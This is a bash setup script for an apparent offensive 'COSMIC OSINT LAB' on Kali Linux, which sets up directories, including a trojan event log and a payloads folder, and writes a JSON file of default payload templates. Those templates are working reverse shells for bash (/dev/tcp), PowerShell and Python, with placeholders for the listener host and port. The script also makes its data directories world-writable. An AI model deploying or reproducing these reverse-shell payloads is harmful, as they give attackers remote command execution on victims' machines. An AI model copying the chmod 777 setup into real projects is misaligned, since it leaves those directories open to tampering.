#!/bin/bash
echo "⚙️ Auto-configuring COSMIC OSINT LAB..."
echo "======================================"

cd /home/kali/COSMIC-OSINT-LAB@888/lab808

# 1. Fix file permissions
echo "1. Setting permissions..."
find public -name "*.php" -exec chmod 755 {} \;
chmod 777 data/ data/logs/ data/sessions/ data/payloads/ 2>/dev/null

# 2. Create symbolic links
echo "2. Creating symbolic links..."
ln -sf $(pwd)/public/cosmic-unified-dashboard.php $(pwd)/public/index.php 2>/dev/null

# 3. Initialize data directories
echo "3. Initializing data directories..."
mkdir -p data/{payloads,logs,sessions,reports,cache}
touch data/logs/trojan_events.log
touch data/logs/security.log

# 4. Generate encryption key if missing
if [ ! -f config/encryption.key ]; then
    echo "4. Generating encryption key..."
    openssl rand -base64 32 > config/encryption.key
    chmod 600 config/encryption.key
fi

# 5. Create default payloads
echo "5. Creating default payload templates..."
mkdir -p system/templates
cat > system/templates/default_payloads.json << 'TEMPLATES'
{
    "reverse_shell": {
        "linux": "#!/bin/bash\nbash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
        "windows": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    }
}
TEMPLATES

# 6. Create health check
echo "6. Creating health check..."
cat > system-check.sh << 'HEALTH'
#!/bin/bash
echo "COSMIC OSINT LAB Health Check"
echo "=============================="
echo "Time: $(date)"
echo ""
echo "Services:"
ps aux | grep -E "php -S|background" | grep -v grep
echo ""
echo "Web Access:"
curl -s http://127.0.0.1:8080/ | grep -o "<title>[^<]*</title>"
echo ""
echo "Disk Usage:"
du -sh data/ 2>/dev/null
echo ""
echo "Logs:"
tail -5 data/logs/*.log 2>/dev/null | head -20
HEALTH

chmod +x system-check.sh

echo ""
echo "✅ Auto-configuration complete!"
echo "Run ./launch-enhanced-cosmic.sh to start"
